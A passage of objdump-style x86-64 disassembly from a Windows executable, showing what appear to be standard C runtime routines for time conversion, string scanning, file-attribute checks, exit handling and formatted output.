   140001d80:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001d86:	48 8d 1d db c5 00 00 	lea    0xc5db(%rip),%rbx        # 0x14000e368
   140001d8d:	41 84 c0             	test   %al,%r8b
   140001d90:	75 2f                	jne    0x140001dc1
   140001d92:	41 0b c0             	or     %r8d,%eax
   140001d95:	48 8d 15 94 12 01 00 	lea    0x11294(%rip),%rdx        # 0x140013030
   140001d9c:	48 8d 0d fd 27 01 00 	lea    0x127fd(%rip),%rcx        # 0x1400145a0
   140001da3:	89 05 0f 28 01 00    	mov    %eax,0x1280f(%rip)        # 0x1400145b8
   140001da9:	e8 3e fd ff ff       	call   0x140001aec
   140001dae:	48 8d 0d 47 b9 00 00 	lea    0xb947(%rip),%rcx        # 0x14000d6fc
   140001db5:	48 89 1d e4 27 01 00 	mov    %rbx,0x127e4(%rip)        # 0x1400145a0
   140001dbc:	e8 eb 15 00 00       	call   0x1400033ac
   140001dc1:	48 8d 15 d8 27 01 00 	lea    0x127d8(%rip),%rdx        # 0x1400145a0
   140001dc8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001dcd:	e8 36 fd ff ff       	call   0x140001b08
   140001dd2:	48 8d 15 67 fa 00 00 	lea    0xfa67(%rip),%rdx        # 0x140011840
   140001dd9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001dde:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001de3:	e8 18 16 00 00       	call   0x140003400
   140001de8:	cc                   	int3
   140001de9:	cc                   	int3
   140001dea:	cc                   	int3
   140001deb:	cc                   	int3
   140001dec:	e9 5f ff ff ff       	jmp    0x140001d50
   140001df1:	cc                   	int3
   140001df2:	cc                   	int3
   140001df3:	cc                   	int3
   140001df4:	40 53                	rex push %rbx
   140001df6:	48 83 ec 20          	sub    $0x20,%rsp
   140001dfa:	48 8b d9             	mov    %rcx,%rbx
   140001dfd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001e02:	ff 15 c0 c2 00 00    	call   *0xc2c0(%rip)        # 0x14000e0c8
   140001e08:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140001e0d:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001e11:	49 bb 00 80 c1 2a 21 	movabs $0xfe624e212ac18000,%r11
   140001e18:	4e 62 fe 
   140001e1b:	48 b8 bd 42 7a e5 d5 	movabs $0xd6bf94d5e57a42bd,%rax
   140001e22:	94 bf d6 
   140001e25:	49 03 d3             	add    %r11,%rdx
   140001e28:	48 f7 e2             	mul    %rdx
   140001e2b:	48 b8 ff 6f 40 93 07 	movabs $0x793406fff,%rax
   140001e32:	00 00 00 
   140001e35:	48 c1 ea 17          	shr    $0x17,%rdx
   140001e39:	48 3b d0             	cmp    %rax,%rdx
   140001e3c:	48 0f 4f d1          	cmovg  %rcx,%rdx
   140001e40:	48 85 db             	test   %rbx,%rbx
   140001e43:	74 03                	je     0x140001e48
   140001e45:	48 89 13             	mov    %rdx,(%rbx)
   140001e48:	48 8b c2             	mov    %rdx,%rax
   140001e4b:	48 83 c4 20          	add    $0x20,%rsp
   140001e4f:	5b                   	pop    %rbx
   140001e50:	c3                   	ret
   140001e51:	cc                   	int3
   140001e52:	cc                   	int3
   140001e53:	cc                   	int3
   140001e54:	4c 8b c9             	mov    %rcx,%r9
   140001e57:	45 33 c0             	xor    %r8d,%r8d
   140001e5a:	8a 01                	mov    (%rcx),%al
   140001e5c:	48 ff c1             	inc    %rcx
   140001e5f:	41 3a c0             	cmp    %r8b,%al
   140001e62:	75 f6                	jne    0x140001e5a
   140001e64:	48 ff c9             	dec    %rcx
   140001e67:	49 3b c9             	cmp    %r9,%rcx
   140001e6a:	74 04                	je     0x140001e70
   140001e6c:	38 11                	cmp    %dl,(%rcx)
   140001e6e:	75 f4                	jne    0x140001e64
   140001e70:	38 11                	cmp    %dl,(%rcx)
   140001e72:	4c 0f 44 c1          	cmove  %rcx,%r8
   140001e76:	49 8b c0             	mov    %r8,%rax
   140001e79:	c3                   	ret
   140001e7a:	cc                   	int3
   140001e7b:	cc                   	int3
   140001e7c:	40 53                	rex push %rbx
   140001e7e:	48 83 ec 30          	sub    $0x30,%rsp
   140001e82:	8b da                	mov    %edx,%ebx
   140001e84:	48 85 c9             	test   %rcx,%rcx
   140001e87:	75 2d                	jne    0x140001eb6
   140001e89:	e8 36 12 00 00       	call   0x1400030c4
   140001e8e:	83 20 00             	andl   $0x0,(%rax)
   140001e91:	e8 0e 12 00 00       	call   0x1400030a4
   140001e96:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001e9c:	bb 16 00 00 00       	mov    $0x16,%ebx
   140001ea1:	45 33 c9             	xor    %r9d,%r9d
   140001ea4:	45 33 c0             	xor    %r8d,%r8d
   140001ea7:	33 d2                	xor    %edx,%edx
   140001ea9:	33 c9                	xor    %ecx,%ecx
   140001eab:	89 18                	mov    %ebx,(%rax)
   140001ead:	e8 22 11 00 00       	call   0x140002fd4
   140001eb2:	8b c3                	mov    %ebx,%eax
   140001eb4:	eb 50                	jmp    0x140001f06
   140001eb6:	f7 c2 f9 ff ff ff    	test   $0xfffffff9,%edx
   140001ebc:	75 cb                	jne    0x140001e89
   140001ebe:	ff 15 0c c2 00 00    	call   *0xc20c(%rip)        # 0x14000e0d0
   140001ec4:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001ec7:	75 16                	jne    0x140001edf
   140001ec9:	ff 15 81 c1 00 00    	call   *0xc181(%rip)        # 0x14000e050
   140001ecf:	8b c8                	mov    %eax,%ecx
   140001ed1:	e8 0e 12 00 00       	call   0x1400030e4
   140001ed6:	e8 c9 11 00 00       	call   0x1400030a4
   140001edb:	8b 00                	mov    (%rax),%eax
   140001edd:	eb 27                	jmp    0x140001f06
   140001edf:	a8 10                	test   $0x10,%al
   140001ee1:	75 21                	jne    0x140001f04
   140001ee3:	a8 01                	test   $0x1,%al
   140001ee5:	74 1d                	je     0x140001f04
   140001ee7:	f6 c3 02             	test   $0x2,%bl
   140001eea:	74 18                	je     0x140001f04
   140001eec:	e8 d3 11 00 00       	call   0x1400030c4
   140001ef1:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   140001ef7:	e8 a8 11 00 00       	call   0x1400030a4
   140001efc:	c7 00 0d 00 00 00    	movl   $0xd,(%rax)
   140001f02:	eb d2                	jmp    0x140001ed6
   140001f04:	33 c0                	xor    %eax,%eax
   140001f06:	48 83 c4 30          	add    $0x30,%rsp
   140001f0a:	5b                   	pop    %rbx
   140001f0b:	c3                   	ret
   140001f0c:	48 83 ec 28          	sub    $0x28,%rsp
   140001f10:	e8 67 ff ff ff       	call   0x140001e7c
   140001f15:	f7 d8                	neg    %eax
   140001f17:	1b c0                	sbb    %eax,%eax
   140001f19:	48 83 c4 28          	add    $0x28,%rsp
   140001f1d:	c3                   	ret
   140001f1e:	cc                   	int3
   140001f1f:	cc                   	int3
   140001f20:	48 83 ec 28          	sub    $0x28,%rsp
   140001f24:	33 d2                	xor    %edx,%edx
   140001f26:	ff 15 ac c1 00 00    	call   *0xc1ac(%rip)        # 0x14000e0d8
   140001f2c:	85 c0                	test   %eax,%eax
   140001f2e:	75 08                	jne    0x140001f38
   140001f30:	ff 15 1a c1 00 00    	call   *0xc11a(%rip)        # 0x14000e050
   140001f36:	eb 02                	jmp    0x140001f3a
   140001f38:	33 c0                	xor    %eax,%eax
   140001f3a:	85 c0                	test   %eax,%eax
   140001f3c:	74 0c                	je     0x140001f4a
   140001f3e:	8b c8                	mov    %eax,%ecx
   140001f40:	e8 9f 11 00 00       	call   0x1400030e4
   140001f45:	83 c8 ff             	or     $0xffffffff,%eax
   140001f48:	eb 02                	jmp    0x140001f4c
   140001f4a:	33 c0                	xor    %eax,%eax
   140001f4c:	48 83 c4 28          	add    $0x28,%rsp
   140001f50:	c3                   	ret
   140001f51:	cc                   	int3
   140001f52:	cc                   	int3
   140001f53:	cc                   	int3
   140001f54:	48 83 ec 28          	sub    $0x28,%rsp
   140001f58:	ff 15 82 c1 00 00    	call   *0xc182(%rip)        # 0x14000e0e0
   140001f5e:	85 c0                	test   %eax,%eax
   140001f60:	75 08                	jne    0x140001f6a
   140001f62:	ff 15 e8 c0 00 00    	call   *0xc0e8(%rip)        # 0x14000e050
   140001f68:	eb 02                	jmp    0x140001f6c
   140001f6a:	33 c0                	xor    %eax,%eax
   140001f6c:	85 c0                	test   %eax,%eax
   140001f6e:	74 0c                	je     0x140001f7c
   140001f70:	8b c8                	mov    %eax,%ecx
   140001f72:	e8 6d 11 00 00       	call   0x1400030e4
   140001f77:	83 c8 ff             	or     $0xffffffff,%eax
   140001f7a:	eb 02                	jmp    0x140001f7e
   140001f7c:	33 c0                	xor    %eax,%eax
   140001f7e:	48 83 c4 28          	add    $0x28,%rsp
   140001f82:	c3                   	ret
   140001f83:	cc                   	int3
   140001f84:	40 53                	rex push %rbx
   140001f86:	48 83 ec 20          	sub    $0x20,%rsp
   140001f8a:	8b d9                	mov    %ecx,%ebx
   140001f8c:	e8 87 1a 00 00       	call   0x140003a18
   140001f91:	8b cb                	mov    %ebx,%ecx
   140001f93:	e8 58 18 00 00       	call   0x1400037f0
   140001f98:	48 8b 0d 99 10 01 00 	mov    0x11099(%rip),%rcx        # 0x140013038
   140001f9f:	e8 04 15 00 00       	call   0x1400034a8
   140001fa4:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140001fa9:	48 83 c4 20          	add    $0x20,%rsp
   140001fad:	5b                   	pop    %rbx
   140001fae:	48 ff e0             	rex.W jmp *%rax
   140001fb1:	cc                   	int3
   140001fb2:	cc                   	int3
   140001fb3:	cc                   	int3
   140001fb4:	40 53                	rex push %rbx
   140001fb6:	48 83 ec 20          	sub    $0x20,%rsp
   140001fba:	8b d9                	mov    %ecx,%ebx
   140001fbc:	48 8d 0d c5 c3 00 00 	lea    0xc3c5(%rip),%rcx        # 0x14000e388
   140001fc3:	ff 15 1f c1 00 00    	call   *0xc11f(%rip)        # 0x14000e0e8
   140001fc9:	48 85 c0             	test   %rax,%rax
   140001fcc:	74 19                	je     0x140001fe7
   140001fce:	48 8d 15 a3 c3 00 00 	lea    0xc3a3(%rip),%rdx        # 0x14000e378
   140001fd5:	48 8b c8             	mov    %rax,%rcx
   140001fd8:	ff 15 2a c0 00 00    	call   *0xc02a(%rip)        # 0x14000e008
   140001fde:	48 85 c0             	test   %rax,%rax
   140001fe1:	74 04                	je     0x140001fe7
   140001fe3:	8b cb                	mov    %ebx,%ecx
   140001fe5:	ff d0                	call   *%rax
   140001fe7:	48 83 c4 20          	add    $0x20,%rsp
   140001feb:	5b                   	pop    %rbx
   140001fec:	c3                   	ret
   140001fed:	cc                   	int3
   140001fee:	cc                   	int3
   140001fef:	cc                   	int3
   140001ff0:	40 53                	rex push %rbx
   140001ff2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ff6:	8b d9                	mov    %ecx,%ebx
   140001ff8:	e8 b7 ff ff ff       	call   0x140001fb4
   140001ffd:	8b cb                	mov    %ebx,%ecx
   140001fff:	ff 15 eb c0 00 00    	call   *0xc0eb(%rip)        # 0x14000e0f0
   140002005:	cc                   	int3
   140002006:	cc                   	int3
   140002007:	cc                   	int3
   140002008:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000200d:	e9 5a 1c 00 00       	jmp    0x140003c6c
   140002012:	cc                   	int3
   140002013:	cc                   	int3
   140002014:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002019:	e9 4e 1b 00 00       	jmp    0x140003b6c
   14000201e:	cc                   	int3
   14000201f:	cc                   	int3
   140002020:	48 3b ca             	cmp    %rdx,%rcx
   140002023:	73 2d                	jae    0x140002052
   140002025:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000202a:	57                   	push   %rdi
   14000202b:	48 83 ec 20          	sub    $0x20,%rsp
   14000202f:	48 8b fa             	mov    %rdx,%rdi
   140002032:	48 8b d9             	mov    %rcx,%rbx
   140002035:	48 8b 03             	mov    (%rbx),%rax
   140002038:	48 85 c0             	test   %rax,%rax
   14000203b:	74 02                	je     0x14000203f
   14000203d:	ff d0                	call   *%rax
   14000203f:	48 83 c3 08          	add    $0x8,%rbx
   140002043:	48 3b df             	cmp    %rdi,%rbx
   140002046:	72 ed                	jb     0x140002035
   140002048:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000204d:	48 83 c4 20          	add    $0x20,%rsp
   140002051:	5f                   	pop    %rdi
   140002052:	c3                   	ret
   140002053:	cc                   	int3
   140002054:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002059:	57                   	push   %rdi
   14000205a:	48 83 ec 20          	sub    $0x20,%rsp
   14000205e:	33 c0                	xor    %eax,%eax
   140002060:	48 8b fa             	mov    %rdx,%rdi
   140002063:	48 8b d9             	mov    %rcx,%rbx
   140002066:	48 3b ca             	cmp    %rdx,%rcx
   140002069:	73 17                	jae    0x140002082
   14000206b:	85 c0                	test   %eax,%eax
   14000206d:	75 13                	jne    0x140002082
   14000206f:	48 8b 0b             	mov    (%rbx),%rcx
   140002072:	48 85 c9             	test   %rcx,%rcx
   140002075:	74 02                	je     0x140002079
   140002077:	ff d1                	call   *%rcx
   140002079:	48 83 c3 08          	add    $0x8,%rbx
   14000207d:	48 3b df             	cmp    %rdi,%rbx
   140002080:	72 e9                	jb     0x14000206b
   140002082:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002087:	48 83 c4 20          	add    $0x20,%rsp
   14000208b:	5f                   	pop    %rdi
   14000208c:	c3                   	ret
   14000208d:	cc                   	int3
   14000208e:	cc                   	int3
   14000208f:	cc                   	int3
   140002090:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002095:	57                   	push   %rdi
   140002096:	48 83 ec 20          	sub    $0x20,%rsp
   14000209a:	48 83 3d 06 47 01 00 	cmpq   $0x0,0x14706(%rip)        # 0x1400167a8
   1400020a1:	00 
   1400020a2:	8b d9                	mov    %ecx,%ebx
   1400020a4:	74 18                	je     0x1400020be
   1400020a6:	48 8d 0d fb 46 01 00 	lea    0x146fb(%rip),%rcx        # 0x1400167a8
   1400020ad:	e8 2e 1d 00 00       	call   0x140003de0
   1400020b2:	85 c0                	test   %eax,%eax
   1400020b4:	74 08                	je     0x1400020be
   1400020b6:	8b cb                	mov    %ebx,%ecx
   1400020b8:	ff 15 ea 46 01 00    	call   *0x146ea(%rip)        # 0x1400167a8
   1400020be:	e8 5d 1c 00 00       	call   0x140003d20
   1400020c3:	48 8d 15 fe c1 00 00 	lea    0xc1fe(%rip),%rdx        # 0x14000e2c8
   1400020ca:	48 8d 0d cf c1 00 00 	lea    0xc1cf(%rip),%rcx        # 0x14000e2a0
   1400020d1:	e8 7e ff ff ff       	call   0x140002054
   1400020d6:	85 c0                	test   %eax,%eax
   1400020d8:	75 5a                	jne    0x140002134
   1400020da:	48 8d 0d 07 1c 00 00 	lea    0x1c07(%rip),%rcx        # 0x140003ce8
   1400020e1:	e8 c6 12 00 00       	call   0x1400033ac
   1400020e6:	48 8d 1d a3 c1 00 00 	lea    0xc1a3(%rip),%rbx        # 0x14000e290
   1400020ed:	48 8d 3d a4 c1 00 00 	lea    0xc1a4(%rip),%rdi        # 0x14000e298
   1400020f4:	eb 0e                	jmp    0x140002104
   1400020f6:	48 8b 03             	mov    (%rbx),%rax
   1400020f9:	48 85 c0             	test   %rax,%rax
   1400020fc:	74 02                	je     0x140002100
   1400020fe:	ff d0                	call   *%rax
   140002100:	48 83 c3 08          	add    $0x8,%rbx
   140002104:	48 3b df             	cmp    %rdi,%rbx
   140002107:	72 ed                	jb     0x1400020f6
   140002109:	48 83 3d 9f 46 01 00 	cmpq   $0x0,0x1469f(%rip)        # 0x1400167b0
   140002110:	00 
   140002111:	74 1f                	je     0x140002132
   140002113:	48 8d 0d 96 46 01 00 	lea    0x14696(%rip),%rcx        # 0x1400167b0
   14000211a:	e8 c1 1c 00 00       	call   0x140003de0
   14000211f:	85 c0                	test   %eax,%eax
   140002121:	74 0f                	je     0x140002132
   140002123:	45 33 c0             	xor    %r8d,%r8d
   140002126:	33 c9                	xor    %ecx,%ecx
   140002128:	41 8d 50 02          	lea    0x2(%r8),%edx
   14000212c:	ff 15 7e 46 01 00    	call   *0x1467e(%rip)        # 0x1400167b0
   140002132:	33 c0                	xor    %eax,%eax
   140002134:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002139:	48 83 c4 20          	add    $0x20,%rsp
   14000213d:	5f                   	pop    %rdi
   14000213e:	c3                   	ret
   14000213f:	cc                   	int3
   140002140:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002145:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000214a:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000214f:	57                   	push   %rdi
   140002150:	41 54                	push   %r12
   140002152:	41 55                	push   %r13
   140002154:	41 56                	push   %r14
   140002156:	41 57                	push   %r15
   140002158:	48 83 ec 40          	sub    $0x40,%rsp
   14000215c:	45 8b e0             	mov    %r8d,%r12d
   14000215f:	8b da                	mov    %edx,%ebx
   140002161:	44 8b f9             	mov    %ecx,%r15d
   140002164:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002169:	e8 fe 1a 00 00       	call   0x140003c6c
   14000216e:	90                   	nop
   14000216f:	83 3d 9a 24 01 00 01 	cmpl   $0x1,0x1249a(%rip)        # 0x140014610
   140002176:	0f 84 fc 00 00 00    	je     0x140002278
   14000217c:	c7 05 86 24 01 00 01 	movl   $0x1,0x12486(%rip)        # 0x14001460c
   140002183:	00 00 00 
   140002186:	44 88 25 7b 24 01 00 	mov    %r12b,0x1247b(%rip)        # 0x140014608
   14000218d:	85 db                	test   %ebx,%ebx
   14000218f:	0f 85 cf 00 00 00    	jne    0x140002264
   140002195:	48 8b 0d fc 45 01 00 	mov    0x145fc(%rip),%rcx        # 0x140016798
   14000219c:	e8 07 13 00 00       	call   0x1400034a8
   1400021a1:	48 8b f0             	mov    %rax,%rsi
   1400021a4:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400021a9:	48 85 c0             	test   %rax,%rax
   1400021ac:	0f 84 9f 00 00 00    	je     0x140002251
   1400021b2:	48 8b 0d d7 45 01 00 	mov    0x145d7(%rip),%rcx        # 0x140016790
   1400021b9:	e8 ea 12 00 00       	call   0x1400034a8
   1400021be:	48 8b f8             	mov    %rax,%rdi
   1400021c1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400021c6:	4c 8b f6             	mov    %rsi,%r14
   1400021c9:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400021ce:	4c 8b e8             	mov    %rax,%r13
   1400021d1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400021d6:	48 83 ef 08          	sub    $0x8,%rdi
   1400021da:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400021df:	48 3b fe             	cmp    %rsi,%rdi
   1400021e2:	72 0c                	jb     0x1400021f0
   1400021e4:	e8 b3 12 00 00       	call   0x14000349c
   1400021e9:	48 39 07             	cmp    %rax,(%rdi)
   1400021ec:	75 02                	jne    0x1400021f0
   1400021ee:	eb e6                	jmp    0x1400021d6
   1400021f0:	48 3b fe             	cmp    %rsi,%rdi
   1400021f3:	72 5c                	jb     0x140002251
   1400021f5:	48 8b 0f             	mov    (%rdi),%rcx
   1400021f8:	e8 ab 12 00 00       	call   0x1400034a8
   1400021fd:	48 8b d8             	mov    %rax,%rbx
   140002200:	e8 97 12 00 00       	call   0x14000349c
   140002205:	48 89 07             	mov    %rax,(%rdi)
   140002208:	ff d3                	call   *%rbx
   14000220a:	48 8b 0d 87 45 01 00 	mov    0x14587(%rip),%rcx        # 0x140016798
   140002211:	e8 92 12 00 00       	call   0x1400034a8
   140002216:	48 8b d8             	mov    %rax,%rbx
   140002219:	48 8b 0d 70 45 01 00 	mov    0x14570(%rip),%rcx        # 0x140016790
   140002220:	e8 83 12 00 00       	call   0x1400034a8
   140002225:	4c 3b f3             	cmp    %rbx,%r14
   140002228:	75 05                	jne    0x14000222f
   14000222a:	4c 3b e8             	cmp    %rax,%r13
   14000222d:	74 20                	je     0x14000224f
   14000222f:	4c 8b f3             	mov    %rbx,%r14
   140002232:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140002237:	48 8b f3             	mov    %rbx,%rsi
   14000223a:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000223f:	4c 8b e8             	mov    %rax,%r13
   140002242:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002247:	48 8b f8             	mov    %rax,%rdi
   14000224a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000224f:	eb 85                	jmp    0x1400021d6
   140002251:	48 8d 15 90 c0 00 00 	lea    0xc090(%rip),%rdx        # 0x14000e2e8
   140002258:	48 8d 0d 71 c0 00 00 	lea    0xc071(%rip),%rcx        # 0x14000e2d0
   14000225f:	e8 bc fd ff ff       	call   0x140002020
   140002264:	48 8d 15 8d c0 00 00 	lea    0xc08d(%rip),%rdx        # 0x14000e2f8
   14000226b:	48 8d 0d 7e c0 00 00 	lea    0xc07e(%rip),%rcx        # 0x14000e2f0
   140002272:	e8 a9 fd ff ff       	call   0x140002020
   140002277:	90                   	nop
   140002278:	45 85 e4             	test   %r12d,%r12d
   14000227b:	74 0a                	je     0x140002287
   14000227d:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002282:	e8 e5 18 00 00       	call   0x140003b6c
   140002287:	45 85 e4             	test   %r12d,%r12d
   14000228a:	75 26                	jne    0x1400022b2
   14000228c:	c7 05 7a 23 01 00 01 	movl   $0x1,0x1237a(%rip)        # 0x140014610
   140002293:	00 00 00 
   140002296:	41 8d 4c 24 08       	lea    0x8(%r12),%ecx
   14000229b:	e8 cc 18 00 00       	call   0x140003b6c
   1400022a0:	41 8b cf             	mov    %r15d,%ecx
   1400022a3:	e8 0c fd ff ff       	call   0x140001fb4
   1400022a8:	41 8b cf             	mov    %r15d,%ecx
   1400022ab:	ff 15 3f be 00 00    	call   *0xbe3f(%rip)        # 0x14000e0f0
   1400022b1:	cc                   	int3
   1400022b2:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400022b7:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400022bc:	48 83 c4 40          	add    $0x40,%rsp
   1400022c0:	41 5f                	pop    %r15
   1400022c2:	41 5e                	pop    %r14
   1400022c4:	41 5d                	pop    %r13
   1400022c6:	41 5c                	pop    %r12
   1400022c8:	5f                   	pop    %rdi
   1400022c9:	c3                   	ret
   1400022ca:	cc                   	int3
   1400022cb:	cc                   	int3
   1400022cc:	45 33 c0             	xor    %r8d,%r8d
   1400022cf:	33 d2                	xor    %edx,%edx
   1400022d1:	e9 6a fe ff ff       	jmp    0x140002140
   1400022d6:	cc                   	int3
   1400022d7:	cc                   	int3
   1400022d8:	45 33 c0             	xor    %r8d,%r8d
   1400022db:	41 8d 50 01          	lea    0x1(%r8),%edx
   1400022df:	e9 5c fe ff ff       	jmp    0x140002140
   1400022e4:	33 d2                	xor    %edx,%edx
   1400022e6:	33 c9                	xor    %ecx,%ecx
   1400022e8:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   1400022ec:	e9 4f fe ff ff       	jmp    0x140002140
   1400022f1:	cc                   	int3
   1400022f2:	cc                   	int3
   1400022f3:	cc                   	int3
   1400022f4:	ba 01 00 00 00       	mov    $0x1,%edx
   1400022f9:	33 c9                	xor    %ecx,%ecx
   1400022fb:	44 8b c2             	mov    %edx,%r8d
   1400022fe:	e9 3d fe ff ff       	jmp    0x140002140
   140002303:	cc                   	int3
   140002304:	40 53                	rex push %rbx
   140002306:	48 83 ec 20          	sub    $0x20,%rsp
   14000230a:	e8 8d 11 00 00       	call   0x14000349c
   14000230f:	48 8b c8             	mov    %rax,%rcx
   140002312:	48 8b d8             	mov    %rax,%rbx
   140002315:	e8 aa 10 00 00       	call   0x1400033c4
   14000231a:	48 8b cb             	mov    %rbx,%rcx
   14000231d:	e8 8e 21 00 00       	call   0x1400044b0
   140002322:	48 8b cb             	mov    %rbx,%rcx
   140002325:	e8 7a 0b 00 00       	call   0x140002ea4
   14000232a:	48 8b cb             	mov    %rbx,%rcx
   14000232d:	e8 76 21 00 00       	call   0x1400044a8
   140002332:	48 8b cb             	mov    %rbx,%rcx
   140002335:	e8 66 21 00 00       	call   0x1400044a0
   14000233a:	48 8b cb             	mov    %rbx,%rcx
   14000233d:	e8 be 1e 00 00       	call   0x140004200
   140002342:	48 8b cb             	mov    %rbx,%rcx
   140002345:	e8 e2 1c 00 00       	call   0x14000402c
   14000234a:	48 8b cb             	mov    %rbx,%rcx
   14000234d:	e8 be 1c 00 00       	call   0x140004010
   140002352:	48 8d 0d 7f ff ff ff 	lea    -0x81(%rip),%rcx        # 0x1400022d8
   140002359:	e8 36 11 00 00       	call   0x140003494
   14000235e:	48 89 05 d3 0c 01 00 	mov    %rax,0x10cd3(%rip)        # 0x140013038
   140002365:	48 83 c4 20          	add    $0x20,%rsp
   140002369:	5b                   	pop    %rbx
   14000236a:	c3                   	ret
   14000236b:	cc                   	int3
   14000236c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002371:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002376:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000237b:	57                   	push   %rdi
   14000237c:	48 83 ec 60          	sub    $0x60,%rsp
   140002380:	33 db                	xor    %ebx,%ebx
   140002382:	4d 8b d1             	mov    %r9,%r10
   140002385:	49 8b e8             	mov    %r8,%rbp
   140002388:	48 8b f2             	mov    %rdx,%rsi
   14000238b:	4c 8b d9             	mov    %rcx,%r11
   14000238e:	4c 3b cb             	cmp    %rbx,%r9
   140002391:	75 27                	jne    0x1400023ba
   140002393:	e8 0c 0d 00 00       	call   0x1400030a4
   140002398:	45 33 c9             	xor    %r9d,%r9d
   14000239b:	45 33 c0             	xor    %r8d,%r8d
   14000239e:	33 d2                	xor    %edx,%edx
   1400023a0:	33 c9                	xor    %ecx,%ecx
   1400023a2:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400023a7:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400023ad:	e8 22 0c 00 00       	call   0x140002fd4
   1400023b2:	83 c8 ff             	or     $0xffffffff,%eax
   1400023b5:	e9 87 00 00 00       	jmp    0x140002441
   1400023ba:	4c 3b c3             	cmp    %rbx,%r8
   1400023bd:	74 05                	je     0x1400023c4
   1400023bf:	48 3b d3             	cmp    %rbx,%rdx
   1400023c2:	74 cf                	je     0x140002393
   1400023c4:	4c 8b 8c 24 98 00 00 	mov    0x98(%rsp),%r9
   1400023cb:	00 
   1400023cc:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
   1400023d1:	41 8b c0             	mov    %r8d,%eax
   1400023d4:	4c 3b c1             	cmp    %rcx,%r8
   1400023d7:	4c 8b 84 24 90 00 00 	mov    0x90(%rsp),%r8
   1400023de:	00 
   1400023df:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   1400023e4:	0f 47 c1             	cmova  %ecx,%eax
   1400023e7:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   1400023ec:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400023f1:	49 8b d2             	mov    %r10,%rdx
   1400023f4:	c7 44 24 48 42 00 00 	movl   $0x42,0x48(%rsp)
   1400023fb:	00 
   1400023fc:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002400:	41 ff d3             	call   *%r11
   140002403:	8b f8                	mov    %eax,%edi
   140002405:	48 3b f3             	cmp    %rbx,%rsi
   140002408:	74 37                	je     0x140002441
   14000240a:	3b c3                	cmp    %ebx,%eax
   14000240c:	7c 25                	jl     0x140002433
   14000240e:	83 6c 24 38 01       	subl   $0x1,0x38(%rsp)
   140002413:	78 09                	js     0x14000241e
   140002415:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000241a:	88 18                	mov    %bl,(%rax)
   14000241c:	eb 11                	jmp    0x14000242f
   14000241e:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002423:	33 c9                	xor    %ecx,%ecx
   140002425:	e8 c6 20 00 00       	call   0x1400044f0
   14000242a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000242d:	74 04                	je     0x140002433
   14000242f:	8b c7                	mov    %edi,%eax
   140002431:	eb 0e                	jmp    0x140002441
   140002433:	39 5c 24 38          	cmp    %ebx,0x38(%rsp)
   140002437:	88 5c 2e ff          	mov    %bl,-0x1(%rsi,%rbp,1)
   14000243b:	0f 9d c3             	setge  %bl
   14000243e:	8d 43 fe             	lea    -0x2(%rbx),%eax
   140002441:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140002446:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000244a:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000244e:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140002452:	49 8b e3             	mov    %r11,%rsp
   140002455:	5f                   	pop    %rdi
   140002456:	c3                   	ret
   140002457:	cc                   	int3
   140002458:	40 53                	rex push %rbx
   14000245a:	48 83 ec 30          	sub    $0x30,%rsp
   14000245e:	48 8b d9             	mov    %rcx,%rbx
   140002461:	4d 85 c0             	test   %r8,%r8
   140002464:	74 47                	je     0x1400024ad
   140002466:	48 85 c9             	test   %rcx,%rcx
   140002469:	74 42                	je     0x1400024ad
   14000246b:	48 85 d2             	test   %rdx,%rdx
   14000246e:	74 3d                	je     0x1400024ad
   140002470:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
